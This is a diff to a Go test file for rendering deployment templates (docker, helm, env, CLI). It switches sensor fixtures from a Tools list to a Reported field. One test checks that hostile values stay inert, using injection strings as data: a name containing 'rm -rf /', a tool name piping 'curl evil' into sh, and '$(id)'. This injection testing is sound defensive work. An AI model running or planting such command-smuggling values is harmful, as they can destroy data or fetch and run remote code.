@@ -58,7 +58,7 @@ func daemonSensor(tools ...string) *sensordom.Sensor {
 	tenantID := shared.NewID()
 	return &sensordom.Sensor{
 		ID: shared.NewID(), TenantID: &tenantID, Name: "DMZ Scanner 01",
-		Type: sensordom.SensorTypeWorker, ExecutionMode: sensordom.ExecutionModeDaemon, Tools: tools,
+		Type: sensordom.SensorTypeWorker, ExecutionMode: sensordom.ExecutionModeDaemon, Reported: sensordom.ReportOf(tools...),
 	}
 }
 
@@ -178,7 +178,7 @@ func TestTemplates_OneShotRunner(t *testing.T) {
 	for _, dir := range templateSources {
 		data := fullData(t)
 		data.Sensor.Type, data.Sensor.ExecutionMode = sensordom.SensorTypeWorker, sensordom.ExecutionModeStandalone
-		data.Sensor.Tools = []string{"semgrep"}
+		data.Sensor.Reported = sensordom.ReportOf("semgrep")
 		d := render(t, dir, data).Docker
 		bashSyntaxOK(t, dir+" runner docker", d)
 		continuationLinesOK(t, dir+" runner docker", d)
@@ -359,7 +359,7 @@ func TestTemplates_HostileValuesStayInert(t *testing.T) {
 	for _, dir := range templateSources {
 		data := fullData(t)
 		data.Sensor.Name = `x"; rm -rf / #`
-		data.Sensor.Tools = []string{"nuclei;curl evil|sh", "$(id)", "trivy"}
+		data.Sensor.Reported = sensordom.ReportOf("nuclei;curl evil|sh", "$(id)", "trivy")
 		out := render(t, dir, data)
 		bashSyntaxOK(t, dir+" docker", out.Docker)
 		for label, s := range map[string]string{"docker": out.Docker, "helm": out.Helm, "env": out.Env, "cli": out.CLI} {
